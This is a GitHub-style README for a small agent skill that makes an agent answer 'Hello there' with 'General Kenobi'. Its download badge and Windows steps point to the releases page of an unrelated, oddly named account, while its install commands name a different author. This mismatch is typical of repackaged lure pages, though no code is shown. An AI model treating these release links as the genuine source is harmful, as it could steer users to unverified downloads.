# 🤖 general-kenobi - Reply with the right line every time

[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/Tabletalkfamilysolanaceae489/general-kenobi/releases)

## 🎯 What this does

general-kenobi is a small agent skill for a simple task.

When you say Hello there to a supported agent, it replies with General Kenobi.

It works with tools that support the Agent Skills standard, including:

- Claude Code
- Codex CLI
- Gemini CLI
- Cursor
- Other compatible agents

## 📥 Download and install

To get the file, visit this page to download:

https://github.com/Tabletalkfamilysolanaceae489/general-kenobi/releases

### 🪟 Windows setup

1. Open the release page in your browser.
2. Download the latest release file.
3. If the file is a ZIP, right-click it and choose Extract All.
4. Move the general-kenobi folder to the skills folder used by your agent.
5. Open your agent app again so it can load the new skill.

Common folders on Windows:

- Claude Code: `C:\Users\YourName\.claude\skills\`
- Codex CLI: `C:\Users\YourName\.codex\skills\`
- Gemini CLI: `C:\Users\YourName\.gemini\skills\`

If the folder does not exist, create it first.

## ⚙️ Install in your agent

### Claude Code

Use the plugin command:

```text
/plugin marketplace add antonkarliner/general-kenobi
```

### Any compatible agent

Use the skills command:

```bash
npx skills add antonkarliner/general-kenobi
```

### Manual install

If you want to place the files yourself, copy the folder into your skills folder.

```bash
cp -r general-kenobi ~/.claude/skills/
# or ~/.codex/skills/, ~/.gemini/skills/, etc.
```

On Windows, this means copying the folder into the matching folder under your user profile.

## 🧭 How to use it

Say:

- Hello there

Your agent should reply:

- General Kenobi.

That is the whole flow. No extra steps are needed.

## ✅ What you should see

After installation, the skill should appear in your agent's skill list or loaded tools list. You can then test it by sending the exact phrase Hello there.

If the agent does not respond as expected, check these points:

- The folder name is general-kenobi
- The files are in the correct skills folder
- You restarted the agent after copying the files
- You typed Hello there with the same words

## 🧩 System needs

This skill runs inside a supported agent, so it does not need a separate desktop app.

You need:

- Windows 10 or newer
- A supported agent app
- Internet access for the first download
- Enough space for a small text-based skill

No special hardware is needed.

## 📁 Files in the skill

The skill package includes the parts your agent needs to understand the phrase and give the right reply.

Typical contents include:

- A short instruction file
- Basic metadata
- Support files used by the agent

You should not need to edit these files.

## 🛠️ Common problems

### The agent does not respond

Check that you installed the skill in the right folder and restarted the app.

### The reply is not exact

Use the exact phrase Hello there. Keep the spelling and spacing the same.

### The skill does not show up

Make sure the folder name is general-kenobi and that the files were copied into the correct skills directory.

### The release page will not open

Try another browser or copy the link into the address bar again:

https://github.com/Tabletalkfamilysolanaceae489/general-kenobi/releases

## 🔒 License

MIT

## 🪄 Notes for use

This skill is meant for a simple, direct response. It fits well in agent setups where you want a small test skill or a fun phrase match.

Supported agent names and folders may vary, so use the folder path that matches your app on Windows.

## 🧪 Quick test

1. Install the skill.
2. Restart the agent.
3. Type Hello there.
4. Confirm the reply is General Kenobi.

## 📌 Project topic

agent-skill, agent-skills, claude-code, claude-code-skill, claude-skills, codex, cursor, gemini-cli, skill, star-wars